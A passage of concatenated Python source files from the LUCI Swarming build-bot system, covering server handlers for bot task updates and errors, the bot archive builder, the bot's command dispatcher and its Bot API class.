u'hard_timeout', u'id', u'io_timeout', u'isolated_stats', u'output',\n    u'output_chunk_start', u'outputs_ref', u'task_id',\n  }\n  REQUIRED_KEYS = {u'id', u'task_id'}\n\n  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.\n  xsrf_token_enforce_on = ()\n\n  @auth.require(acl.is_bot)\n  def post(self, task_id=None):\n    # Unlike handshake and poll, we do not accept invalid keys here. This code\n    # path is much more strict.\n    request = self.parse_body()\n    msg = log_unexpected_subset_keys(\n        self.ACCEPTED_KEYS, self.REQUIRED_KEYS, request, self.request, 'bot',\n        'keys')\n    if msg:\n      self.abort_with_error(400, error=msg)\n\n    bot_id = request['id']\n    cost_usd = request['cost_usd']\n    task_id = request['task_id']\n\n    bot_overhead = request.get('bot_overhead')\n    duration = request.get('duration')\n    exit_code = request.get('exit_code')\n    hard_timeout = request.get('hard_timeout')\n    io_timeout = request.get('io_timeout')\n    isolated_stats = request.get('isolated_stats')\n    output = request.get('output')\n    output_chunk_start = request.get('output_chunk_start')\n    outputs_ref = request.get('outputs_ref')\n\n    if bool(isolated_stats) != (bot_overhead is not None):\n      ereporter2.log_request(\n          request=self.request,\n          source='server',\n          category='task_failure',\n          message='Failed to update task: %s' % task_id)\n      self.abort_with_error(\n          400,\n          error='Both bot_overhead and isolated_stats must be set '\n                'simultaneously\\nbot_overhead: %s\\nisolated_stats: %s' %\n                (bot_overhead, isolated_stats))\n\n    run_result_key = task_pack.unpack_run_result_key(task_id)\n    performance_stats = None\n    if isolated_stats:\n      download = isolated_stats['download']\n      upload = isolated_stats['upload']\n      performance_stats = task_result.PerformanceStats(\n          bot_overhead=bot_overhead,\n          isolated_download=task_result.IsolatedOperation(\n              duration=download['duration'],\n              initial_number_items=download['initial_number_items'],\n              initial_size=download['initial_size'],\n              items_cold=base64.b64decode(download['items_cold']),\n              items_hot=base64.b64decode(download['items_hot'])),\n          isolated_upload=task_result.IsolatedOperation(\n              duration=upload['duration'],\n              items_cold=base64.b64decode(upload['items_cold']),\n              items_hot=base64.b64decode(upload['items_hot'])))\n\n    if output is not None:\n      try:\n        output = base64.b64decode(output)\n      except UnicodeEncodeError as e:\n        logging.error('Failed to decode output\\n%s\\n%r', e, output)\n        output = output.encode('ascii', 'replace')\n      except TypeError as e:\n        # Save the output as-is instead. The error will be logged in ereporter2\n        # and returning a HTTP 500 would only force the bot to stay in a retry\n        # loop.\n        logging.error('Failed to decode output\\n%s\\n%r', e, output)\n    if outputs_ref:\n      outputs_ref = task_request.FilesRef(**outputs_ref)\n\n    try:\n      state = task_scheduler.bot_update_task(\n          run_result_key=run_result_key,\n          bot_id=bot_id,\n          output=output,\n          output_chunk_start=output_chunk_start,\n          exit_code=exit_code,\n          duration=duration,\n          hard_timeout=hard_timeout,\n          io_timeout=io_timeout,\n          cost_usd=cost_usd,\n          outputs_ref=outputs_ref,\n          performance_stats=performance_stats)\n      if not state:\n        logging.info('Failed to update, please retry')\n        self.abort_with_error(500, error='Failed to update, please retry')\n\n      if state in (task_result.State.COMPLETED, task_result.State.TIMED_OUT):\n        action = 'task_completed'\n      else:\n        assert state == task_result.State.RUNNING, state\n        action = 'task_update'\n      bot_management.bot_event(\n          event_type=action, bot_id=bot_id,\n          external_ip=self.request.remote_addr, dimensions=None, state=None,\n          version=None, quarantined=None, task_id=task_id, task_name=None)\n    except ValueError as e:\n      ereporter2.log_request(\n          request=self.request,\n          source='server',\n          category='task_failure',\n          message='Failed to update task: %s' % e)\n      self.abort_with_error(400, error=str(e))\n    except webob.exc.HTTPException:\n      raise\n    except Exception as e:\n      logging.exception('Internal error: %s', e)\n      self.abort_with_error(500, error=str(e))\n\n    # TODO(maruel): When a task is canceled, reply with 'DIE' so that the bot\n    # reboots itself to abort the task abruptly. It is useful when a task hangs\n    # and the timeout was set too long or the task was superseded by a newer\n    # task with more recent executable (e.g. a new Try Server job on a newer\n    # patchset on Rietveld).\n    self.send_response({'ok': True})\n\n\nclass BotTaskErrorHandler(auth.ApiHandler):\n  \"\"\"It is a specialized version of ereporter2's /ereporter2/api/v1/on_error\n  that also attaches a task id to it.\n\n  This formally kills the task, marking it as an internal failure. This can be\n  used by bot_main.py to kill the task when task_runner misbehaved.\n  \"\"\"\n\n  EXPECTED_KEYS = {u'id', u'message', u'task_id'}\n\n  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.\n  xsrf_token_enforce_on = ()\n\n  @auth.require(acl.is_bot)\n  def post(self, task_id=None):\n    request = self.parse_body()\n    bot_id = request.get('id')\n    task_id = request.get('task_id', '')\n    message = request.get('message', 'unknown')\n\n    bot_management.bot_event(\n        event_type='task_error', bot_id=bot_id,\n        external_ip=self.request.remote_addr, dimensions=None, state=None,\n        version=None, quarantined=None, task_id=task_id, task_name=None,\n        message=message)\n    line = (\n        'Bot: https://%s/restricted/bot/%s\\n'\n        'Task failed: https://%s/user/task/%s\\n'\n        '%s') % (\n        app_identity.get_default_version_hostname(), bot_id,\n        app_identity.get_default_version_hostname(), task_id,\n        message)\n    ereporter2.log_request(self.request, source='bot', message=line)\n\n    msg = log_unexpected_keys(\n        self.EXPECTED_KEYS, request, self.request, 'bot', 'keys')\n    if msg:\n      self.abort_with_error(400, error=msg)\n\n    msg = task_scheduler.bot_kill_task(\n        task_pack.unpack_run_result_key(task_id), bot_id)\n    if msg:\n      logging.error(msg)\n      self.abort_with_error(400, error=msg)\n    self.send_response({})\n\n\nclass ServerPingHandler(webapp2.RequestHandler):\n  \"\"\"Handler to ping when checking if the server is up.\n\n  This handler should be extremely lightweight. It shouldn't do any\n  computations, it should just state that the server is up. It's open to\n  everyone for simplicity and performance.\n  \"\"\"\n\n  def get(self):\n    self.response.headers['Content-Type'] = 'text/plain; charset=utf-8'\n    self.response.out.write('Server up')\n\n\ndef get_routes():\n  routes = [\n      ('/bootstrap', BootstrapHandler),\n      ('/bot_code', BotCodeHandler),\n      ('/swarming/api/v1/bot/bot_code/<version:[0-9a-f]{40}>', BotCodeHandler),\n      ('/swarming/api/v1/bot/event', BotEventHandler),\n      ('/swarming/api/v1/bot/handshake', BotHandshakeHandler),\n      ('/swarming/api/v1/bot/poll', BotPollHandler),\n      ('/swarming/api/v1/bot/server_ping', ServerPingHandler),\n      ('/swarming/api/v1/bot/task_update', BotTaskUpdateHandler),\n      ('/swarming/api/v1/bot/task_update/<task_id:[a-f0-9]+>',\n          BotTaskUpdateHandler),\n      ('/swarming/api/v1/bot/task_error', BotTaskErrorHandler),\n      ('/swarming/api/v1/bot/task_error/<task_id:[a-f0-9]+>',\n          BotTaskErrorHandler),\n  ]\n  return [webapp2.Route(*i) for i in routes]\n/n/n/nappengine/swarming/server/bot_archive.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Generates the swarming_bot.zip archive for the bot.\n\nUnlike the other source files, this file can be run from ../tools/bot_archive.py\nstand-alone to generate a swarming_bot.zip for local testing so it doesn't\nimport anything from the AppEngine SDK.\n\nThe hash of the content of the files in the archive is used to define the\ncurrent version of the swarming bot code.\n\"\"\"\n\nimport hashlib\nimport json\nimport logging\nimport os\nimport StringIO\nimport zipfile\n\n\n# List of files needed by the swarming bot.\n# TODO(maruel): Make the list automatically generated?\nFILES = (\n    '__main__.py',\n    'api/__init__.py',\n    'api/bot.py',\n    'api/parallel.py',\n    'api/os_utilities.py',\n    'api/platforms/__init__.py',\n    'api/platforms/android.py',\n    'api/platforms/common.py',\n    'api/platforms/gce.py',\n    'api/platforms/linux.py',\n    'api/platforms/osx.py',\n    'api/platforms/posix.py',\n    'api/platforms/win.py',\n    'bot_code/__init__.py',\n    'bot_code/bot_main.py',\n    'bot_code/common.py',\n    'bot_code/singleton.py',\n    'bot_code/task_runner.py',\n    'client/auth.py',\n    'client/isolated_format.py',\n    'client/isolateserver.py',\n    'client/run_isolated.py',\n    'config/__init__.py',\n    'third_party/__init__.py',\n    'third_party/colorama/__init__.py',\n    'third_party/colorama/ansi.py',\n    'third_party/colorama/ansitowin32.py',\n    'third_party/colorama/initialise.py',\n    'third_party/colorama/win32.py',\n    'third_party/colorama/winterm.py',\n    'third_party/depot_tools/__init__.py',\n    'third_party/depot_tools/fix_encoding.py',\n    'third_party/depot_tools/subcommand.py',\n    'third_party/httplib2/__init__.py',\n    'third_party/httplib2/cacerts.txt',\n    'third_party/httplib2/iri2uri.py',\n    'third_party/httplib2/socks.py',\n    'third_party/oauth2client/__init__.py',\n    'third_party/oauth2client/_helpers.py',\n    'third_party/oauth2client/_openssl_crypt.py',\n    'third_party/oauth2client/_pycrypto_crypt.py',\n    'third_party/oauth2client/client.py',\n    'third_party/oauth2client/clientsecrets.py',\n    'third_party/oauth2client/crypt.py',\n    'third_party/oauth2client/file.py',\n    'third_party/oauth2client/gce.py',\n    'third_party/oauth2client/keyring_storage.py',\n    'third_party/oauth2client/locked_file.py',\n    'third_party/oauth2client/multistore_file.py',\n    'third_party/oauth2client/service_account.py',\n    'third_party/oauth2client/tools.py',\n    'third_party/oauth2client/util.py',\n    'third_party/oauth2client/xsrfutil.py',\n    'third_party/pyasn1/pyasn1/__init__.py',\n    'third_party/pyasn1/pyasn1/codec/__init__.py',\n    'third_party/pyasn1/pyasn1/codec/ber/__init__.py',\n    'third_party/pyasn1/pyasn1/codec/ber/decoder.py',\n    'third_party/pyasn1/pyasn1/codec/ber/encoder.py',\n    'third_party/pyasn1/pyasn1/codec/ber/eoo.py',\n    'third_party/pyasn1/pyasn1/codec/cer/__init__.py',\n    'third_party/pyasn1/pyasn1/codec/cer/decoder.py',\n    'third_party/pyasn1/pyasn1/codec/cer/encoder.py',\n    'third_party/pyasn1/pyasn1/codec/der/__init__.py',\n    'third_party/pyasn1/pyasn1/codec/der/decoder.py',\n    'third_party/pyasn1/pyasn1/codec/der/encoder.py',\n    'third_party/pyasn1/pyasn1/compat/__init__.py',\n    'third_party/pyasn1/pyasn1/compat/binary.py',\n    'third_party/pyasn1/pyasn1/compat/octets.py',\n    'third_party/pyasn1/pyasn1/debug.py',\n    'third_party/pyasn1/pyasn1/error.py',\n    'third_party/pyasn1/pyasn1/type/__init__.py',\n    'third_party/pyasn1/pyasn1/type/base.py',\n    'third_party/pyasn1/pyasn1/type/char.py',\n    'third_party/pyasn1/pyasn1/type/constraint.py',\n    'third_party/pyasn1/pyasn1/type/error.py',\n    'third_party/pyasn1/pyasn1/type/namedtype.py',\n    'third_party/pyasn1/pyasn1/type/namedval.py',\n    'third_party/pyasn1/pyasn1/type/tag.py',\n    'third_party/pyasn1/pyasn1/type/tagmap.py',\n    'third_party/pyasn1/pyasn1/type/univ.py',\n    'third_party/pyasn1/pyasn1/type/useful.py',\n    'third_party/requests/__init__.py',\n    'third_party/requests/adapters.py',\n    'third_party/requests/api.py',\n    'third_party/requests/auth.py',\n    'third_party/requests/certs.py',\n    'third_party/requests/compat.py',\n    'third_party/requests/cookies.py',\n    'third_party/requests/exceptions.py',\n    'third_party/requests/hooks.py',\n    'third_party/requests/models.py',\n    'third_party/requests/packages/__init__.py',\n    'third_party/requests/packages/urllib3/__init__.py',\n    'third_party/requests/packages/urllib3/_collections.py',\n    'third_party/requests/packages/urllib3/connection.py',\n    'third_party/requests/packages/urllib3/connectionpool.py',\n    'third_party/requests/packages/urllib3/contrib/__init__.py',\n    'third_party/requests/packages/urllib3/contrib/ntlmpool.py',\n    'third_party/requests/packages/urllib3/contrib/pyopenssl.py',\n    'third_party/requests/packages/urllib3/exceptions.py',\n    'third_party/requests/packages/urllib3/fields.py',\n    'third_party/requests/packages/urllib3/filepost.py',\n    'third_party/requests/packages/urllib3/packages/__init__.py',\n    'third_party/requests/packages/urllib3/packages/ordered_dict.py',\n    'third_party/requests/packages/urllib3/packages/six.py',\n    'third_party/requests/packages/urllib3/packages/ssl_match_hostname/'\n        '__init__.py',\n    'third_party/requests/packages/urllib3/packages/ssl_match_hostname/'\n        '_implementation.py',\n    'third_party/requests/packages/urllib3/poolmanager.py',\n    'third_party/requests/packages/urllib3/request.py',\n    'third_party/requests/packages/urllib3/response.py',\n    'third_party/requests/packages/urllib3/util/__init__.py',\n    'third_party/requests/packages/urllib3/util/connection.py',\n    'third_party/requests/packages/urllib3/util/request.py',\n    'third_party/requests/packages/urllib3/util/response.py',\n    'third_party/requests/packages/urllib3/util/retry.py',\n    'third_party/requests/packages/urllib3/util/ssl_.py',\n    'third_party/requests/packages/urllib3/util/timeout.py',\n    'third_party/requests/packages/urllib3/util/url.py',\n    'third_party/requests/sessions.py',\n    'third_party/requests/status_codes.py',\n    'third_party/requests/structures.py',\n    'third_party/requests/utils.py',\n    'third_party/rsa/rsa/__init__.py',\n    'third_party/rsa/rsa/_compat.py',\n    'third_party/rsa/rsa/_version133.py',\n    'third_party/rsa/rsa/_version200.py',\n    'third_party/rsa/rsa/asn1.py',\n    'third_party/rsa/rsa/bigfile.py',\n    'third_party/rsa/rsa/cli.py',\n    'third_party/rsa/rsa/common.py',\n    'third_party/rsa/rsa/core.py',\n    'third_party/rsa/rsa/key.py',\n    'third_party/rsa/rsa/parallel.py',\n    'third_party/rsa/rsa/pem.py',\n    'third_party/rsa/rsa/pkcs1.py',\n    'third_party/rsa/rsa/prime.py',\n    'third_party/rsa/rsa/randnum.py',\n    'third_party/rsa/rsa/transform.py',\n    'third_party/rsa/rsa/util.py',\n    'third_party/rsa/rsa/varblock.py',\n    'third_party/six/__init__.py',\n    'utils/__init__.py',\n    'utils/cacert.pem',\n    'utils/file_path.py',\n    'utils/fs.py',\n    'utils/large.py',\n    'utils/logging_utils.py',\n    'utils/lru.py',\n    'utils/net.py',\n    'utils/oauth.py',\n    'utils/on_error.py',\n    'utils/subprocess42.py',\n    'utils/threading_utils.py',\n    'utils/tools.py',\n    'utils/zip_package.py',\n    'adb/__init__.py',\n    'adb/adb_commands.py',\n    'adb/adb_protocol.py',\n    'adb/common.py',\n    'adb/contrib/__init__.py',\n    'adb/contrib/adb_commands_safe.py',\n    'adb/contrib/high.py',\n    'adb/contrib/parallel.py',\n    'adb/fastboot.py',\n    'adb/filesync_protocol.py',\n    'adb/sign_pythonrsa.py',\n    'adb/usb_exceptions.py',\n    'python_libusb1/__init__.py',\n    'python_libusb1/libusb1.py',\n    'python_libusb1/usb1.py',\n)\n\n\ndef is_windows():\n  \"\"\"Returns True if this code is running under Windows.\"\"\"\n  return os.__file__[0] != '/'\n\n\ndef resolve_symlink(path):\n  \"\"\"Processes path containing symlink on Windows.\n\n  This is needed to make ../swarming_bot/main_test.py pass on Windows because\n  git on Windows renders symlinks as normal files.\n  \"\"\"\n  if not is_windows():\n    # Only does this dance on Windows.\n    return path\n  parts = os.path.normpath(path).split(os.path.sep)\n  for i in xrange(2, len(parts)):\n    partial = os.path.sep.join(parts[:i])\n    if os.path.isfile(partial):\n      with open(partial) as f:\n        link = f.read()\n      assert '\\n' not in link and link, link\n      parts[i-1] = link\n  return os.path.normpath(os.path.sep.join(parts))\n\n\ndef yield_swarming_bot_files(root_dir, host, host_version, additionals):\n  \"\"\"Yields all the files to map as tuple(filename, content).\n\n  config.json is injected with json data about the server.\n\n  This function guarantees that the output is sorted by filename.\n  \"\"\"\n  items = {i: None for i in FILES}\n  items.update(additionals)\n  config = {\n    'server': host.rstrip('/'),\n    'server_version': host_version,\n  }\n  items['config/config.json'] = json.dumps(config)\n  for item, content in sorted(items.iteritems()):\n    if content is not None:\n      yield item, content\n    else:\n      with open(resolve_symlink(os.path.join(root_dir, item)), 'rb') as f:\n        yield item, f.read()\n\n\ndef get_swarming_bot_zip(root_dir, host, host_version, additionals):\n  \"\"\"Returns a zipped file of all the files a bot needs to run.\n\n  Arguments:\n    root_dir: directory swarming_bot.\n    additionals: dict(filepath: content) of additional items to put into the zip\n        file, in addition to FILES and MAPPED. In practice, it's going to be a\n        custom bot_config.py.\n  Returns:\n    Tuple(str being the zipped file's content, bot version (SHA-1) it\n    represents).\n  \"\"\"\n  zip_memory_file = StringIO.StringIO()\n  h = hashlib.sha1()\n  with zipfile.ZipFile(zip_memory_file, 'w', zipfile.ZIP_DEFLATED) as zip_file:\n    for name, content in yield_swarming_bot_files(\n        root_dir, host, host_version, additionals):\n      zip_file.writestr(name, content)\n      h.update(str(len(name)))\n      h.update(name)\n      h.update(str(len(content)))\n      h.update(content)\n\n  data = zip_memory_file.getvalue()\n  bot_version = h.hexdigest()\n  logging.info(\n      'get_swarming_bot_zip(%s) is %d bytes; %s',\n      additionals.keys(), len(data), bot_version)\n  return data, bot_version\n\n\ndef get_swarming_bot_version(root_dir, host, host_version, additionals):\n  \"\"\"Returns the SHA1 hash of the bot code, representing the version.\n\n  Arguments:\n    root_dir: directory swarming_bot.\n    additionals: See get_swarming_bot_zip's doc.\n\n  Returns:\n    The SHA1 hash of the bot code.\n  \"\"\"\n  h = hashlib.sha1()\n  try:\n    # TODO(maruel): Deduplicate from zip_package.genereate_version().\n    for name, content in yield_swarming_bot_files(\n        root_dir, host, host_version, additionals):\n      h.update(str(len(name)))\n      h.update(name)\n      h.update(str(len(content)))\n      h.update(content)\n  except IOError:\n    logging.warning('Missing expected file. Hash will be invalid.')\n  bot_version = h.hexdigest()\n  logging.info(\n      'get_swarming_bot_version(%s) = %s', sorted(additionals), bot_version)\n  return bot_version\n/n/n/nappengine/swarming/swarming_bot/__main__.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Runs either task_runner.py, bot_main.py or bot_config.py.\n\nThe imports are done late so if an ImportError occurs, it is localized to this\ncommand only.\n\"\"\"\n\nimport code\nimport json\nimport logging\nimport os\nimport optparse\nimport shutil\nimport sys\nimport zipfile\n\n# That's from ../../../client/\nfrom third_party.depot_tools import fix_encoding\nfrom utils import logging_utils\nfrom utils import zip_package\n\n# This file can only be run as a zip.\nTHIS_FILE = os.path.abspath(zip_package.get_main_script_path())\n\n\n# libusb1 expects to be directly in sys.path.\nsys.path.insert(0, os.path.join(THIS_FILE, 'python_libusb1'))\n\n# Copied from //client/utils/oauth.py.\nsys.path.insert(0, os.path.join(THIS_FILE, 'third_party'))\nsys.path.insert(0, os.path.join(THIS_FILE, 'third_party', 'pyasn1'))\nsys.path.insert(0, os.path.join(THIS_FILE, 'third_party', 'rsa'))\n\nfrom bot_code import common\n\n\n# TODO(maruel): Use depot_tools/subcommand.py. The goal here is to have all the\n# sub commands packed into the single .zip file as a swiss army knife (think\n# busybox but worse).\n\n\ndef CMDattributes(_args):\n  \"\"\"Prints out the bot's attributes.\"\"\"\n  from bot_code import bot_main\n  json.dump(\n      bot_main.get_attributes(bot_main.get_bot()), sys.stdout, indent=2,\n      sort_keys=True, separators=(',', ': '))\n  print('')\n  return 0\n\n\ndef CMDconfig(_args):\n  \"\"\"Prints the config.json embedded in this zip.\"\"\"\n  logging_utils.prepare_logging(None)\n  from bot_code import bot_main\n  json.dump(bot_main.get_config(), sys.stdout, indent=2, sort_keys=True)\n  print('')\n  return 0\n\n\ndef CMDis_fine(_args):\n  \"\"\"Just reports that the code doesn't throw.\n\n  That ensures that the bot has minimal viability before transfering control to\n  it. For now, it just imports bot_main but later it'll check the config, etc.\n  \"\"\"\n  # pylint: disable=unused-variable\n  from bot_code import bot_main\n  from config import bot_config\n  # We're #goodenough.\n  return 0\n\n\ndef CMDrestart(_args):\n  \"\"\"Utility subcommand that hides the difference between each OS to reboot\n  the host.\"\"\"\n  logging_utils.prepare_logging(None)\n  import os_utilities\n  # This function doesn't return.\n  os_utilities.restart()\n  # Should never reach here.\n  return 1\n\n\ndef CMDrun_isolated(args):\n  \"\"\"Internal command to run an isolated command.\"\"\"\n  sys.path.insert(0, os.path.join(THIS_FILE, 'client'))\n  # run_isolated setups logging by itself.\n  import run_isolated\n  return run_isolated.main(args)\n\n\ndef CMDsetup(_args):\n  \"\"\"Setup the bot to auto-start but doesn't start the bot.\"\"\"\n  logging_utils.prepare_logging(os.path.join('logs', 'bot_config.log'))\n  from bot_code import bot_main\n  bot_main.setup_bot(True)\n  return 0\n\n\ndef CMDserver(_args):\n  \"\"\"Prints the server url. It's like 'config' but easier to parse.\"\"\"\n  logging_utils.prepare_logging(None)\n  from bot_code import bot_main\n  print bot_main.get_config()['server']\n  return 0\n\n\ndef CMDshell(args):\n  \"\"\"Starts a shell with api.* in..\"\"\"\n  logging_utils.prepare_logging(None)\n  logging_utils.set_console_level(logging.DEBUG)\n\n  from bot_code import bot_main\n  from api import os_utilities\n  from api import platforms\n  local_vars = {\n    'bot_main': bot_main,\n    'json': json,\n    'os_utilities': os_utilities,\n    'platforms': platforms,\n  }\n  # Can't use: from api.platforms import *\n  local_vars.update(\n      (k, v) for k, v in platforms.__dict__.iteritems()\n      if not k.startswith('_'))\n\n  if args:\n    for arg in args:\n      exec code.compile_command(arg) in local_vars\n  else:\n    code.interact(\n        'Locals:\\n  ' + '\\n  '.join( sorted(local_vars)), None, local_vars)\n  return 0\n\n\ndef CMDstart_bot(args):\n  \"\"\"Starts the swarming bot.\"\"\"\n  logging_utils.prepare_logging(os.path.join('logs', 'swarming_bot.log'))\n  logging.info(\n      'importing bot_main: %s, %s', THIS_FILE, zip_package.generate_version())\n  from bot_code import bot_main\n  result = bot_main.main(args)\n  logging.info('bot_main exit code: %d', result)\n  return result\n\n\ndef CMDstart_slave(args):\n  \"\"\"Ill named command that actually sets up the bot then start it.\"\"\"\n  # TODO(maruel): Rename function.\n  logging_utils.prepare_logging(os.path.join('logs', 'bot_config.log'))\n\n  parser = optparse.OptionParser()\n  parser.add_option(\n      '--survive', action='store_true',\n      help='Do not reboot the host even if bot_config.setup_bot() asked to')\n  options, args = parser.parse_args(args)\n\n  try:\n    from bot_code import bot_main\n    bot_main.setup_bot(options.survive)\n  except Exception:\n    logging.exception('bot_main.py failed.')\n\n  logging.info('Starting the bot: %s', THIS_FILE)\n  return common.exec_python([THIS_FILE, 'start_bot'])\n\n\ndef CMDtask_runner(args):\n  \"\"\"Internal command to run a swarming task.\"\"\"\n  logging_utils.prepare_logging(os.path.join('logs', 'task_runner.log'))\n  from bot_code import task_runner\n  return task_runner.main(args)\n\n\ndef CMDversion(_args):\n  \"\"\"Prints the version of this file and the hash of the code.\"\"\"\n  logging_utils.prepare_logging(None)\n  print zip_package.generate_version()\n  return 0\n\n\ndef main():\n  if os.getenv('CHROME_REMOTE_DESKTOP_SESSION') == '1':\n    # Disable itself when run under Google Chrome Remote Desktop, as it's\n    # normally started at the console and starting up via Remote Desktop would\n    # cause multiple bots to run concurrently on the host.\n    print >> sys.stderr, (\n        'Inhibiting Swarming bot under Google Chrome Remote Desktop.')\n    return 0\n\n  # Always make the current working directory the directory containing this\n  # file. It simplifies assumptions.\n  os.chdir(os.path.dirname(THIS_FILE))\n  # Always create the logs dir first thing, before printing anything out.\n  if not os.path.isdir('logs'):\n    os.mkdir('logs')\n\n  # This is necessary so os.path.join() works with unicode path. No kidding.\n  # This must be done here as each of the command take wildly different code\n  # path and this must be run in every case, as it causes really unexpected\n  # issues otherwise, especially in module os.path.\n  fix_encoding.fix_encoding()\n\n  if os.path.basename(THIS_FILE) == 'swarming_bot.zip':\n    # Self-replicate itself right away as swarming_bot.1.zip and restart as it.\n    print >> sys.stderr, 'Self replicating pid:%d.' % os.getpid()\n    if os.path.isfile('swarming_bot.1.zip'):\n      os.remove('swarming_bot.1.zip')\n    shutil.copyfile('swarming_bot.zip', 'swarming_bot.1.zip')\n    cmd = ['swarming_bot.1.zip'] + sys.argv[1:]\n    print >> sys.stderr, 'cmd: %s' % cmd\n    return common.exec_python(cmd)\n\n  # sys.argv[0] is the zip file itself.\n  cmd = 'start_slave'\n  args = []\n  if len(sys.argv) > 1:\n    cmd = sys.argv[1]\n    args = sys.argv[2:]\n\n  fn = getattr(sys.modules[__name__], 'CMD%s' % cmd, None)\n  if fn:\n    try:\n      return fn(args)\n    except ImportError:\n      logging.exception('Failed to run %s', cmd)\n      with zipfile.ZipFile(THIS_FILE, 'r') as f:\n        logging.error('Files in %s:\\n%s', THIS_FILE, f.namelist())\n      return 1\n\n  print >> sys.stderr, 'Unknown command %s' % cmd\n  return 1\n\n\nif __name__ == '__main__':\n  sys.exit(main())\n/n/n/nappengine/swarming/swarming_bot/api/bot.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Bot interface used in bot_config.py.\"\"\"\n\nimport logging\nimport os\nimport threading\nimport time\n\nimport os_utilities\nfrom utils import net\nfrom utils import zip_package\n\nTHIS_FILE = os.path.abspath(zip_package.get_main_script_path())\n\n# Method could be a function - pylint: disable=R0201\n\n\nclass Bot(object):\n  def __init__(\n      self, attributes, server, server_version, base_dir, shutdown_hook):\n    # Do not expose attributes  for now, as attributes may be refactored.\n    assert server is None or not server.endswith('/'), server\n    self._attributes = attributes\n    self._base_dir = base_dir\n    self._server = server\n    self._server_version = server_version\n    self._shutdown_hook = shutdown_hook\n    self._timers = []\n    self._timers_dying = False\n    self._timers_lock = threading.Lock()\n\n  @property\n  def base_dir(self):\n    \"\"\"Returns the working directory.\n\n    It is normally the current workind directory, e.g. os.getcwd() but it is\n    preferable to not assume that.\n    \"\"\"\n    return self._base_dir\n\n  @property\n  def dimensions(self):\n    \"\"\"The bot's current dimensions.\n\n    Dimensions are relatively static and not expected to change much. They\n    should change only when it effectively affects the bot's capacity to execute\n    tasks.\n    \"\"\"\n    return self._attributes.get('dimensions', {}).copy()\n\n  @property\n  def id(self):\n    \"\"\"Returns the bot's ID.\"\"\"\n    return self.dimensions.get('id', ['unknown'])[0]\n\n  @property\n  def server(self):\n    \"\"\"URL of the swarming server this bot is connected to.\n\n    It includes the https:// prefix but without trailing /, so it looks like\n    \"https://foo-bar.appspot.com\".\n    \"\"\"\n    return self._server\n\n  @property\n  def server_version(self):\n    \"\"\"Version of the server's implementation.\n\n    The form is nnn-hhhhhhh for pristine version and nnn-hhhhhhh-tainted-uuuu\n    for non-upstreamed code base:\n      nnn: revision pseudo number\n      hhhhhhh: git commit hash\n      uuuu: username\n    \"\"\"\n    return self._server_version\n\n  @property\n  def state(self):\n    return self._attributes['state']\n\n  @property\n  def swarming_bot_zip(self):\n    \"\"\"Absolute path to the swarming_bot.zip file.\n\n    The bot itself is run as swarming_bot.1.zip or swarming_bot.2.zip. Always\n    return swarming_bot.zip since this is the script that must be used when\n    starting up.\n    \"\"\"\n    return os.path.join(os.path.dirname(THIS_FILE), 'swarming_bot.zip')\n\n  def post_event(self, event_type, message):\n    \"\"\"Posts an event to the server.\"\"\"\n    data = self._attributes.copy()\n    data['event'] = event_type\n    data['message'] = message\n    net.url_read_json(self.server + '/swarming/api/v1/bot/event', data=data)\n\n  def post_error(self, message):\n    \"\"\"Posts given string as a failure.\n\n    This is used in case of internal code error. It traps exception.\n    \"\"\"\n    logging.error('Error: %s\\n%s', self._attributes, message)\n    try:\n      self.post_event('bot_error', message)\n    except Exception:\n      logging.exception('post_error(%s) failed.', message)\n\n  def restart(self, message):\n    \"\"\"Reboots the machine.\n\n    If the reboot is successful, never returns: the process should just be\n    killed by OS.\n\n    If reboot fails, logs the error to the server and moves the bot to\n    quarantined mode.\n    \"\"\"\n    self.post_event('bot_rebooting', message)\n    self.cancel_all_timers()\n    if self._shutdown_hook:\n      try:\n        self._shutdown_hook(self)\n      except Exception as e:\n        logging.exception('shutdown hook failed: %s', e)\n    # os_utilities.restart should never return, unless restart is not happening.\n    # If restart is taking longer than N minutes, it probably not going to\n    # finish at all. Report this to the server.\n    try:\n      os_utilities.restart(message, timeout=15*60)\n    except LookupError:\n      # This is a special case where OSX is deeply hosed. In that case the disk\n      # is likely in read-only mode and there isn't much that can be done. This\n      # exception is deep inside pickle.py. So notify the server then hang in\n      # there.\n      self.post_error('This host partition is bad; please fix the host')\n      while True:\n        time.sleep(1)\n    self.post_error('Bot is stuck restarting for: %s' % message)\n\n  def call_later(self, delay_sec, callback):\n    \"\"\"Schedules a function to be called later (if bot is still running).\n\n    All calls are executed in a separate internal thread, be careful with what\n    you call from there (Bot object is generally not thread safe).\n\n    Multiple callbacks can be executed concurrently. It is safe to call\n    'call_later' from the callback.\n    \"\"\"\n    timer = None\n\n    def call_wrapper():\n      with self._timers_lock:\n        # Canceled already?\n        if timer not in self._timers:\n          return\n        self._timers.remove(timer)\n      try:\n        callback()\n      except Exception:\n        logging.exception('Timer callback failed')\n\n    with self._timers_lock:\n      if not self._timers_dying:\n        timer = threading.Timer(delay_sec, call_wrapper)\n        self._timers.append(timer)\n        timer.daemon = True\n        timer.start()\n\n  def cancel_all_timers(self):\n    \"\"\"Cancels all pending 'call_later' calls and forbids adding new ones.\"\"\"\n    timers = None\n    with self._timers_lock:\n      self._timers_dying = True\n      for t in self._timers:\n        t.cancel()\n      timers, self._timers = self._timers, []\n    for t in timers:\n      t.join(timeout=5)\n      if t.isAlive():\n        logging.error('Timer thread did not terminate fast enough: %s', t)\n\n  def update_dimensions(self, new_dimensions):\n    \"\"\"Called internally to update Bot.dimensions.\"\"\"\n    self._attributes['dimensions'] = new_dimensions\n\n  def update_state(self, new_state):\n    \"\"\"Called internally to update Bot.state.\"\"\"\n    self._attributes['state'] = new_state\n/n/n/nappengine/swarming/swarming_bot/api/bot_test.py/n/n#!/usr/bin/env python\n# Copyright 2014 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\nimport os\nimport sys\nimport unittest\nimport threading\n\nTHIS_FILE = os.path.abspath(__file__)\n\nimport test_env_api\ntest_env_api.setup_test_env()\n\nimport 